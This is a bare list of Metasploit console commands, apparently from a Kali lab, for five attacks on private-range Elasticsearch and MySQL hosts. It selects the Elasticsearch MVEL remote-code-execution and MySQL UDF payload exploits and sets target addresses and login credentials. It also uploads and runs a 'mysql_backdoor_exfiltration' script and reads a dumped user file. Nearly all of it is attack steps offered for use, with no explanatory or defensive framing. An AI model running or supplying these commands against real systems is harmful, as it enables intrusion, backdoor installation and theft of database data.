



# data_injection attack 


# msfconsole
# search elasticsearch
# use exploit/multi/elasticsearch/script_mvel_rce
# set RHOST 192.168.43.132
# set RPORT 9200
# nano data_injection.py
# python3 data_injection.py


# data_extraction attack 


# search elasticsearch
# use exploit/multi/elasticsearch/script_mvel_rce
# set RHOST 192.168.43.132
# set RPORT 9200
# nano data_extraction.py
# python3 data_extraction.py


# brute_force_elasticsearch attack 


# search elasticsearch
# use exploit/multi/elasticsearch/script_mvel_rce
# set RHOST 192.168.43.132
# set RPORT 9200
# nano brute_force_elasticsearch.py
# python3 brute_force_elasticsearch.py



# mysql_backdoor_exfiltration attack 

# search elasticsearch
# use exploit/multi/elasticsearch/script_mvel_rce
# set RHOST 192.168.43.132
# set RPORT 9200
# upload /home/kali/mysql_backdoor_exfiltration.sh /tmp/
# exec chmod +x /tmp/mysql_backdoor_exfiltration.sh
# exec /tmp/mysql_backdoor_exfiltration.sh
# exec cat /tmp/data_dump_users.txt


# mysql_bruteforce attack 

# use exploit/unix/mysql/mysql_udf_payload
# set RHOST 192.168.43.230
# set USERNAME testuser
# set PASSWORD password
# run
# nano mysql_bruteforce.sh
# chmd +x mysql_bruteforce.sh
# ./mysql_bruteforce.sh
